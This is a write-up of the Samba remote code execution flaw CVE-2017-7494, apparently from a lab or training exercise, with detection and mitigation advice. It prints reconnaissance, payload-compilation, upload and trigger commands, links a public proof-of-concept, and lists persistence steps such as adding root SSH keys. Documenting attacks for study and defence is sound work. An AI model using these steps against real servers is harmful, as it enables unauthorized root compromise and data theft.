# CVE-2017-7494 — Samba Remote Code Execution

---

## 1. Vulnerability Overview

### Name / Type
Samba Remote Code Execution via Malicious Shared Library Upload 
Vulnerability Type: Remote Code Execution (RCE)

### CVE
**CVE-2017-7494**

### Severity
**Critical**

This vulnerability allows a remote, unauthenticated attacker to execute arbitrary code on a vulnerable Samba server. If the Samba service is running with elevated privileges, successful exploitation results in root-level command execution.

Impact includes:
- Full system compromise
- Lateral movement within a network
- Data exfiltration or destruction
- Persistence mechanisms (backdoors, cron jobs, services)

### Attack Vector
An attacker:
1. Identifies a Samba service exposed over the network
2. Locates a writable SMB share
3. Uploads a malicious shared object (.so) file
4. Forces Samba to load the library via a named pipe request

No authentication is required if the share allows guest access.

---

## 2. Exploitation Steps

### 2.1 Reconnaissance

#### Goal
Identify whether a target is running a vulnerable version of Samba and exposes a writable share.

#### Tools Used
- `nmap`
- `smbclient`

#### Service Discovery

```bash
nmap -p 445 --script smb-os-discovery <TARGET_IP>
```

**Indicators of vulnerability:**
- Samba version 3.5.0 – 4.6.4
- SMB service exposed on TCP 445

#### Share Enumeration

```bash
smbclient -L //<TARGET_IP>/ -N
```

Look for shares that are:
- Writable
- Guest-accessible

---

### 2.2 Exploitation

#### Tools / Scripts Used
- Custom PoC exploit (betab0t)
- `gcc`
- `smbclient`
- Python

PoC Source:
```
https://github.com/betab0t/cve-2017-7494
```

#### Step 1: Prepare Payload

```bash
gcc -shared -fPIC payload.c -o payload.so
```

This creates a malicious shared library that will be executed by Samba.

#### Step 2: Upload Payload to Writable Share

```bash
smbclient //<TARGET_IP>/vulnshare -N
put payload.so
```

#### Step 3: Trigger the Vulnerability

```bash
python exploit.py <TARGET_IP> vulnshare payload.so
```

At this stage, Samba loads the malicious `.so` file and executes attacker-controlled code.

---

### 2.3 Post-Exploitation

Once code execution is achieved, the attacker can:

#### Privilege Escalation
- Exploit typically executes as root due to how `smbd` runs

#### Data Access
- Read or modify sensitive files
- Dump credentials
- Access shared corporate data

#### Persistence
- Add SSH keys to `/root/.ssh/authorized_keys`
- Install cron jobs
- Drop backdoor services

---

## 3. Defensive Considerations

### 3.1 Detection

#### Host-Based Indicators
- Unexpected `.so` files inside Samba share directories
- `smbd` spawning unusual child processes
- Logs showing named pipe interactions

Relevant logs:
- `/opt/samba-4.5.9/var/log.smbd`
- `/var/log/syslog`

#### Network-Based Indicators
- SMB traffic uploading `.so` files
- Abnormal SMB named pipe requests

---

### 3.2 Mitigation

#### Patching
- Upgrade Samba to 4.6.5 or newer
- Apply vendor security patches

#### Configuration Hardening
- Disable guest access
- Remove write permissions from public shares
- Restrict SMB access via firewall rules

#### Compensating Controls
- IDS/IPS monitoring SMB traffic
- Application allowlisting

---
